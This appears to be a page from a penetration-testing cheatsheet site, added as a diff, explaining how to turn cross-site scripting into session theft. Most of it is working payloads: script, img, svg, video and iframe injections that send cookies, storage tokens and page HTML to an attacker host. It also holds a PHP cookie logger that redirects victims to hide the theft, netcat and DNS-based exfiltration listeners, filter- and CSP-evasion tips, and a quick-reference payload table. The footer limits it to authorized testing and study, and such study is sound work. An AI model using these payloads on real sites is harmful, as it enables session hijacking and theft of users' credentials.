@@ -1,0 +1,302 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>XSS to Session · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Sessions</nav><h1>XSS to Session</h1><p class="cx-lede">Using cross-site scripting as a session-stealing primitive - document.cookie exfiltration patterns, HttpOnly check, the cookie-logger PHP server, and modern callback infrastructure (XSSHunter, Burp Collaborator, Interactsh) for blind XSS verification.</p><div class="cx-tags"><span class="cx-tag">MITRE T1539, T1059.007, T1185</span><span class="cx-tag">D3FEND D3-TB, D3-NTA</span><span class="cx-tag">IMPACT SessionTakeover, CredentialTheft</span><span class="cx-tag">OWASP A03, A07</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>When XSS executes in a victim's browser and their session cookies <em>aren't</em> <code>HttpOnly</code>, the cookies are JavaScript-readable as <code>document.cookie</code> and the attacker can send them anywhere. The exfiltration step is mechanical once the XSS is in place:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Confirm cookies are JavaScript-readable
+//  Open DevTools console on the target, type:
+document.cookie
+//  If session cookies appear in the output, HttpOnly is missing → exfiltrate-able
+
+# 2. The exfiltration payloads (one-liners)
+&lt;script&gt;fetch(&#x27;http://attacker:8000/?c=&#x27; + btoa(document.cookie))&lt;/script&gt;
+&lt;img src=x onerror=&quot;fetch(&#x27;http://attacker:8000/?c=&#x27; + btoa(document.cookie))&quot;&gt;
+
+# 3. Listener - receives the cookie
+python3 -m http.server 8000
+# Or for cleaner logging:
+nc -nlvp 8000
+
+# 4. Decode the captured value
+echo &#x27;YXV0aC1zZXNzaW9uPWFiYzEyMy4uLg==&#x27; | base64 -d
+# auth-session=abc123...</code></pre></figure>
+<p>Success indicator: your listener receives an HTTP request with the victim's cookie in the URL parameter; decoded, it's the valid session identifier you can use to hijack.</p>
+<h2 id="the-httponly-gate">The HttpOnly gate</h2>
+<p><code>HttpOnly</code> is a cookie attribute that <em>forbids</em> JavaScript access. With <code>HttpOnly</code> set:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Set-Cookie: auth-session=abc123; HttpOnly; Secure; SameSite=Strict</code></pre></figure>
+<p>The browser sends this cookie on every request to the origin but <code>document.cookie</code> doesn't return it. XSS can do everything else in the victim's browser but it can't read <code>auth-session</code>.</p>
+<p>Without <code>HttpOnly</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Set-Cookie: auth-session=abc123; Secure; SameSite=Strict</code></pre></figure>
+<p><code>document.cookie</code> returns <code>"auth-session=abc123"</code>. XSS reads it. Game over for session secrecy.</p>
+<p><strong>Always check first</strong>: in the target's DevTools, run <code>document.cookie</code>. If your session cookie's name appears, XSS-to-session works. If it doesn't, the cookie is HttpOnly and you need a different angle (CSRF, see <a href="../csrf/index.html">CSRF</a>, or the XSS-CSRF chain in <a href="../xss-csrf-chain/index.html">XSS + CSRF chain</a>).</p>
+<p>You can also check from the Application/Storage tab - Cookies → look at the <code>HttpOnly</code> column. Or from curl:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">curl -sI http://target/login -X POST -d &#x27;user=test&amp;pass=test&#x27; | grep -i set-cookie
+# Set-Cookie: auth-session=...; HttpOnly; Secure
+#                              ^^^^^^^^ - present means JS can&#x27;t read</code></pre></figure>
+<h2 id="xss-variants-and-where-they-fire">XSS variants and where they fire</h2>
+<p>Brief refresher since this isn't the dedicated XSS page:</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Where the payload lives</th>
+<th>When it fires</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Reflected</strong></td>
+<td>URL parameter, header, form input - bounced back unescaped in response</td>
+<td>When victim visits the crafted URL</td>
+</tr>
+<tr>
+<td><strong>Stored</strong></td>
+<td>Database, file, app state - persisted server-side</td>
+<td>Every time <em>anyone</em> views the page that renders it</td>
+</tr>
+<tr>
+<td><strong>DOM-based</strong></td>
+<td>URL fragment (<code>#...</code>), <code>postMessage</code>, other client-only sources</td>
+<td>When victim visits the URL; never reaches the server</td>
+</tr>
+<tr>
+<td><strong>Blind</strong></td>
+<td>Stored payload in admin-only context (logs, support tickets, audit views)</td>
+<td>When an admin views the affected page later</td>
+</tr>
+</tbody>
+</table>
+<p>For session theft, <strong>stored</strong> XSS is the operator's prize - it persists, fires on every viewer (including admins), and the exfiltration runs without coordinating with the victim. Reflected works but requires the victim to click your link. DOM-based is similar to reflected in delivery. Blind is the highest-value because the firing audience tends to be high-privilege.</p>
+<h2 id="the-exfiltration-payloads">The exfiltration payloads</h2>
+<p>Several flavors of cookie-stealer, each with tradeoffs.</p>
+<h3 id="pattern-1-script-tag-with-fetch">Pattern 1 - <code>&lt;script&gt;</code> tag with fetch</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;fetch(&#x27;http://ATTACKER:8000/c?d=&#x27; + btoa(document.cookie))&lt;/script&gt;</code></pre></figure>
+<p>Clean, modern, no redirect needed. <code>fetch</code> makes the request asynchronously; the victim's browsing experience continues unchanged. <code>btoa</code> base64-encodes the cookie so special characters (<code>=</code>, <code>;</code>, <code>+</code>) don't corrupt the URL.</p>
+<p>Sometimes <code>&lt;script&gt;</code> tags are filtered by app-side input sanitization. Move to pattern 2.</p>
+<h3 id="pattern-2-img-onerror-the-classic">Pattern 2 - <code>&lt;img onerror&gt;</code> (the classic)</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;img src=x onerror=&quot;fetch(&#x27;http://ATTACKER:8000/c?d=&#x27; + btoa(document.cookie))&quot;&gt;</code></pre></figure>
+<p><code>src=x</code> is a guaranteed-bad URL, triggering <code>onerror</code> immediately. Inside the handler, run the exfil. Works when <code>&lt;script&gt;</code> is filtered but <code>&lt;img&gt;</code> isn't (common - apps often allow images for legitimate use).</p>
+<h3 id="pattern-3-video-onerror-audio-onerror-svg-onload">Pattern 3 - <code>&lt;video onerror&gt;</code> / <code>&lt;audio onerror&gt;</code> / <code>&lt;svg onload&gt;</code></h3>
+<p>For when <code>&lt;img&gt;</code> is also filtered:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;svg onload=&quot;fetch(&#x27;http://ATTACKER:8000/c?d=&#x27; + btoa(document.cookie))&quot;&gt;
+&lt;video&gt;&lt;source onerror=&quot;fetch(&#x27;http://ATTACKER:8000/c?d=&#x27; + btoa(document.cookie))&quot;&gt;&lt;/video&gt;</code></pre></figure>
+<p>Modern browsers fire these in essentially the same conditions as <code>&lt;img onerror&gt;</code>. Pick whichever passes the app's filter.</p>
+<h3 id="pattern-4-self-triggering-animation-typical">Pattern 4 - Self-triggering animation (typical)</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;style&gt;@keyframes x{}&lt;/style&gt;
+&lt;video style=&quot;animation-name:x&quot;
+       onanimationend=&quot;window.location=&#x27;http://ATTACKER:8000/log.php?c=&#x27;+document.cookie&quot;&gt;
+&lt;/video&gt;</code></pre></figure>
+<p>The <code>@keyframes x{}</code> is an empty animation; assigning it to a <code>&lt;video&gt;</code> causes <code>onanimationend</code> to fire immediately. Less commonly filtered because the components are unusual (animations are rarely in filter blocklists; <code>&lt;video&gt;</code> is allowed for embedding).</p>
+<p>Note this one uses <code>window.location</code> rather than <code>fetch</code> - it <em>navigates</em> the victim away to your URL. The cookie hits your server because it's part of the URL. Downsides:</p>
+<ul>
+<li>The victim notices the navigation (page disappears)</li>
+<li>After your server receives the request, you should redirect back to the original site (<code>header("Location: http://target/")</code>) so the victim doesn't realize what happened</li>
+</ul>
+<p>Use <code>fetch</code> for stealth; use <code>window.location</code> if <code>fetch</code> is blocked by CSP.</p>
+<h3 id="pattern-5-image-creation-via-documentwrite">Pattern 5 - Image-creation via <code>document.write</code></h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;h1 onmouseover=&#x27;document.write(`&lt;img src=&quot;http://ATTACKER:8000/?c=${btoa(document.cookie)}&quot;&gt;`)&#x27;&gt;
+  hover me
+&lt;/h1&gt;</code></pre></figure>
+<p>Triggers on hover (<code>onmouseover</code>). The <code>document.write</code> injects a new <code>&lt;img&gt;</code> whose <code>src</code> includes the cookie - the browser tries to fetch the image, your server receives the URL.</p>
+<p>Use case: when payload size is constrained and event handlers are filtered for <code>script</code> keyword but not for <code>mouseover</code>.</p>
+<h3 id="pattern-6-onload">Pattern 6 - onload</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;body onload=&quot;fetch(&#x27;http://ATTACKER:8000/c?d=&#x27; + btoa(document.cookie))&quot;&gt;</code></pre></figure>
+<p>Fires once the body loads. The attacker has to inject into a context where <code>&lt;body&gt;</code> tag attributes are reachable - possible in some HTML-injection-flavored XSS but not all.</p>
+<h3 id="pattern-7-iframe-srcdoc-for-sandbox-aware-exfil">Pattern 7 - <code>&lt;iframe srcdoc&gt;</code> for sandbox-aware exfil</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;iframe srcdoc=&quot;&lt;script&gt;parent.fetch(&#x27;http://ATTACKER:8000/c?d=&#x27; + btoa(parent.document.cookie))&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;</code></pre></figure>
+<p>Sometimes useful when the iframe context doesn't have the cookies but the parent does and same-origin policy permits the inner script to read the parent.</p>
+<h2 id="the-https-gotcha">The HTTPS gotcha</h2>
+<p>When the target site uses HTTPS, your exfil URL must also be HTTPS - modern browsers block "mixed content" (HTTPS page making HTTP request) silently:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>[blocked] http://attacker:8000/  (mixed content; blocked by browser)
+[ok]      https://attacker.com/  (matching scheme)</code></pre></figure>
+<p>The browser fires no error message that the page can see; the request simply doesn't go out. You watch your listener, see nothing, and the payload looks broken.</p>
+<p>Solutions:</p>
+<ol>
+<li><strong>HTTPS endpoint</strong> - run your listener behind an HTTPS-terminating proxy (Caddy, ngrok, Cloudflare tunnel) so the URL is <code>https://</code></li>
+<li><strong>Out-of-band channel</strong> - use DNS exfil instead of HTTP. <code>&lt;img src="http://${btoa(document.cookie)}.attacker.com/"&gt;</code> triggers a DNS lookup containing the cookie even if no HTTP request actually goes out. Pair with <code>XSSHunter</code> or <code>Interactsh</code> (next section).</li>
+<li><strong>Site-internal URL</strong> - chain via an open redirect on the target site to your endpoint; the <em>first</em> hop is same-scheme so it's allowed.</li>
+</ol>
+<h2 id="callback-infrastructure">Callback infrastructure</h2>
+<p>A bare PHP cookie-logger or Netcat listener works in CTFs but real engagements need more.</p>
+<h3 id="simple-php-cookie-logger">Simple PHP cookie logger</h3>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php
+// log.php - minimal cookie logger
+$logFile = &quot;cookieLog.txt&quot;;
+$cookie  = $_REQUEST[&quot;c&quot;] ?? &quot;(empty)&quot;;
+$ip      = $_SERVER[&quot;REMOTE_ADDR&quot;];
+$ua      = $_SERVER[&quot;HTTP_USER_AGENT&quot;];
+$time    = date(&#x27;Y-m-d H:i:s&#x27;);
+
+$handle = fopen($logFile, &quot;a&quot;);
+fwrite($handle, &quot;[$time] $ip ($ua)\n$cookie\n\n&quot;);
+fclose($handle);
+
+// Redirect away so the victim&#x27;s browser appears to navigate normally
+header(&quot;Location: https://www.google.com/&quot;);
+exit;
+?&gt;</code></pre></figure>
+<p>Save as <code>log.php</code>. Serve with:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">php -S 0.0.0.0:8000</code></pre></figure>
+<p>The exfil payload then targets <code>http://YOUR-IP:8000/log.php?c=...</code>. The log file contains:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>[2024-09-30 11:23:45] 10.10.14.5 (Mozilla/5.0 ...)
+auth-session=eyJhbGciOiJIUzI1NiJ9...
+
+[2024-09-30 11:24:01] 192.168.1.20 (Mozilla/5.0 ...)
+auth-session=other-victim-cookie...</code></pre></figure>
+<p>Each hit is timestamped, IP-stamped, UA-stamped. Useful for identifying which victim sent which cookie when multiple are firing.</p>
+<h3 id="netcat-listener">Netcat listener</h3>
+<p>For one-shot use:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ nc -nlvp 8000
+listening on [any] 8000 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.14.7] 43210
+GET /?c=YXV0aC1zZXNzaW9uPWVKaGJHY2lP... HTTP/1.1
+Host: 10.10.14.5:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64)
+Accept: */*
+Referer: http://xss.example.net/profile?email=...</code></pre></figure>
+<p>The Referer header is bonus: tells you exactly which page the XSS fired on. Useful for confirming which payload location triggered.</p>
+<p>After the first hit, Netcat closes. For multiple captures, loop:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">while true; do nc -nlvp 8000; done</code></pre></figure>
+<h3 id="xsshunter-xssreport">XSSHunter / xss.report</h3>
+<p><a href="https://xsshunter.com">XSS Hunter</a> (now self-hosted) and forks like xss.report provide:</p>
+<ul>
+<li>A unique callback domain per probe</li>
+<li>Full screenshot of the victim's browser at the moment of exfil</li>
+<li>DOM snapshot</li>
+<li>Cookies, localStorage, sessionStorage all captured</li>
+<li>Origin URL, victim IP, victim UA</li>
+</ul>
+<p>The payload becomes:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script src=&quot;//YOUR-SUBDOMAIN.xss.ht&quot;&gt;&lt;/script&gt;</code></pre></figure>
+<p>That's it. Their server-side JS does all the exfiltration including HttpOnly-aware data (since it runs in the victim's context).</p>
+<p>The screenshot is the killer feature - it captures what the victim was actually looking at when the payload fired. For blind XSS (where you injected the payload in an admin-only context and have no way to know if/when it fires), the screenshot is your only evidence the attack worked.</p>
+<h3 id="burp-collaborator">Burp Collaborator</h3>
+<p>PortSwigger's Burp Collaborator is the same idea, integrated into Burp:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://[random].burpcollaborator.net</code></pre></figure>
+<p>Every HTTP, DNS, or SMTP request to the random subdomain shows up in Burp's Collaborator tab. For session-cookie exfil, you'd use the HTTP endpoint:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;img src=x onerror=&quot;fetch(&#x27;http://[random].burpcollaborator.net/?c=&#x27; + btoa(document.cookie))&quot;&gt;</code></pre></figure>
+<p>Pro plan only for the public Collaborator server. Self-hosting is possible.</p>
+<h3 id="project-interactsh">Project Interactsh</h3>
+<p><a href="https://github.com/projectdiscovery/interactsh">Interactsh</a> is the open-source equivalent - self-hostable, supports DNS / HTTP / SMTP. Run a private instance, get unique subdomains, capture all out-of-band callbacks.</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Run client (gets you a unique subdomain)
+$ interactsh-client
+[xx.xx.xx.xx] Got HTTP interaction from xyz.oast.live
+[xx.xx.xx.xx] Got DNS interaction from xyz.oast.live</code></pre></figure>
+<p>DNS-based exfil works even when HTTP is blocked outbound from the victim's network:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;img src=&quot;x&quot; onerror=&quot;fetch(&#x27;http://&#x27;+btoa(document.cookie).slice(0,60)+&#x27;.xyz.oast.live&#x27;)&quot;&gt;</code></pre></figure>
+<p>The DNS query to the encoded subdomain reaches Interactsh's DNS server; you read the subdomain to recover the cookie value.</p>
+<h2 id="encoding-considerations">Encoding considerations</h2>
+<p><code>btoa(document.cookie)</code> does base64 - most cookie values are URL-safe but <code>+</code> and <code>/</code> are not, so base64 with no further encoding works as an inline URL parameter:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">fetch(&#x27;http://attacker/c?d=&#x27; + btoa(document.cookie))
+//  http://attacker/c?d=YXV0aC1zZXNzaW9uPWFiYzEyMzs=</code></pre></figure>
+<p>Note <code>=</code> padding survives URL inclusion in modern browsers. If your callback infrastructure is fussy:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">fetch(&#x27;http://attacker/c?d=&#x27; + encodeURIComponent(btoa(document.cookie)))</code></pre></figure>
+<p>Or hex:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">const hex = s =&gt; Array.from(s).map(c =&gt; c.charCodeAt(0).toString(16).padStart(2,&#x27;0&#x27;)).join(&#x27;&#x27;);
+fetch(&#x27;http://attacker/c?d=&#x27; + hex(document.cookie));</code></pre></figure>
+<p>Recover with <code>xxd -r -p</code> or <code>Buffer.from(hex, 'hex').toString()</code>.</p>
+<h2 id="the-whole-context-exfil-not-just-cookies">The whole-context exfil - not just cookies</h2>
+<p>Once XSS fires, you can grab <em>everything</em> in the victim's browser tab:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">const data = {
+  cookie:    document.cookie,
+  href:      document.location.href,
+  referrer:  document.referrer,
+  localStorage: Object.entries(localStorage),
+  sessionStorage: Object.entries(sessionStorage),
+  html:      document.documentElement.outerHTML.slice(0, 50000),  // limit size
+};
+fetch(&#x27;http://attacker/c&#x27;, {
+  method: &#x27;POST&#x27;,
+  body: JSON.stringify(data),
+  mode: &#x27;no-cors&#x27;,
+});</code></pre></figure>
+<p>This catches:</p>
+<ul>
+<li>Cookies (if not HttpOnly)</li>
+<li>The page the victim is on (URL - useful for confirming which page triggered)</li>
+<li>The Referer (where they came from)</li>
+<li>localStorage - often contains JWT tokens, user IDs, app state</li>
+<li>sessionStorage - same</li>
+<li>HTML snapshot - useful for spotting nonces, CSRF tokens embedded in the DOM, user data displayed on screen</li>
+</ul>
+<p>The <code>mode: 'no-cors'</code> is important - without it, the fetch is blocked by CORS for cross-origin POSTs. With it, the browser sends the request opaquely (you can't read the response from JS but your server can read the body).</p>
+<h2 id="defense-considerations">Defense considerations</h2>
+<p>When your exfil isn't working, walk down this checklist:</p>
+<ol>
+<li><strong><code>document.cookie</code> returns empty or doesn't contain the session cookie</strong> → HttpOnly is set on it. XSS can't read it. See <a href="../xss-csrf-chain/index.html">XSS + CSRF chain</a> for the alternative.</li>
+<li><strong>No listener hit at all</strong> → mixed-content blocking (HTTPS target making HTTP exfil request), CSP <code>connect-src</code> blocking, network egress filtering on the victim's network. Try DNS-based out-of-band.</li>
+<li><strong>Payload doesn't fire</strong> → app-side input sanitization. Try alternate event handlers (<code>onmouseover</code>, <code>onanimationend</code>, <code>onloadstart</code>).</li>
+<li><strong>Payload fires but cookie is empty</strong> → cookie is HttpOnly, or the cookie's path/domain doesn't match the page the XSS is on.</li>
+<li><strong>CSP errors in console</strong> → the app has a Content Security Policy that forbids inline scripts or external fetches. Look for <code>report-uri</code> directives that might leak which directive was violated. Bypass via <code>data:</code> URLs, <code>&lt;base&gt;</code> tag injection, or CSP-specific bypasses (a separate topic).</li>
+</ol>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Payload / command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Check HttpOnly</td>
+<td>DevTools console → <code>document.cookie</code></td>
+</tr>
+<tr>
+<td><code>&lt;script&gt;</code> exfil</td>
+<td><code>&lt;script&gt;fetch('http://A/?c='+btoa(document.cookie))&lt;/script&gt;</code></td>
+</tr>
+<tr>
+<td><code>&lt;img onerror&gt;</code> exfil</td>
+<td><code>&lt;img src=x onerror="fetch('http://A/?c='+btoa(document.cookie))"&gt;</code></td>
+</tr>
+<tr>
+<td><code>&lt;svg onload&gt;</code></td>
+<td><code>&lt;svg onload="fetch('http://A/?c='+btoa(document.cookie))"&gt;</code></td>
+</tr>
+<tr>
+<td>Hover exfil</td>
+<td><code>&lt;h1 onmouseover="fetch('http://A/?c='+btoa(document.cookie))"&gt;x&lt;/h1&gt;</code></td>
+</tr>
+<tr>
+<td>Whole-context POST</td>
+<td>See <code>fetch('http://A/c', {method:'POST', body:..., mode:'no-cors'})</code></td>
+</tr>
+<tr>
+<td>PHP cookie logger</td>
+<td>Save <code>log.php</code>, run <code>php -S 0.0.0.0:8000</code></td>
+</tr>
+<tr>
+<td>Netcat one-shot</td>
+<td><code>nc -nlvp 8000</code></td>
+</tr>
+<tr>
+<td>Netcat looping</td>
+<td><code>while true; do nc -nlvp 8000; done</code></td>
+</tr>
+<tr>
+<td>Decode base64 cookie</td>
+<td><code>echo 'X' \| base64 -d</code></td>
+</tr>
+<tr>
+<td>XSSHunter probe</td>
+<td><code>&lt;script src="//SUB.xss.ht"&gt;&lt;/script&gt;</code></td>
+</tr>
+<tr>
+<td>Burp Collaborator</td>
+<td>unique <code>.burpcollaborator.net</code> URL</td>
+</tr>
+<tr>
+<td>Interactsh</td>
+<td><code>interactsh-client</code> for unique <code>.oast.live</code></td>
+</tr>
+<tr>
+<td>DNS exfil pattern</td>
+<td><code>&lt;img src='http://'+btoa(c).slice(0,60)+'.oast.live'&gt;</code></td>
+</tr>
+</tbody>
+</table></article><nav class="cx-pager"><a class="cx-prev" href="../weak-identifiers/index.html">Previous: Weak Session Identifiers</a><a class="cx-next" href="../csrf/index.html">Next: CSRF</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
